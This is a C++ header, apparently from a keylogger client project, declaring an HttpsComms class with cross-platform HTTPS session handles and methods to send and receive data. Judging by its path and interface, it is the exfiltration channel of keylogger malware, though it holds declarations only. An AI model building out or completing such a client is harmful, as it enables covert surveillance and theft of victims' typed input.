// KeyLoggerClient/include/communication/HttpsComms.h
#ifndef HTTPSCOMMS_H
#define HTTPSCOMMS_H

#include "communication/BaseComms.h"
#include "core/Platform.h"
#include <vector>
#include <cstdint>

class Configuration;

class HttpsComms : public BaseComms {
public:
    explicit HttpsComms(Configuration* config);
    ~HttpsComms() override;
    
    bool Initialize() override;
    bool SendData(const std::vector<uint8_t>& data) override;
    void Cleanup() override;
    [[nodiscard]] bool TestConnection() const override;
    std::vector<uint8_t> ReceiveData() override;
    
private:
    Configuration* m_config;
    
    #if PLATFORM_WINDOWS
    HINTERNET m_hSession;
    HINTERNET m_hConnect;
    bool ConfigureSslWindows();
    #else
    void* m_hSession;
    void* m_hConnect;
    bool ConfigureSslLinux(void* curl);
    #endif
};

#endif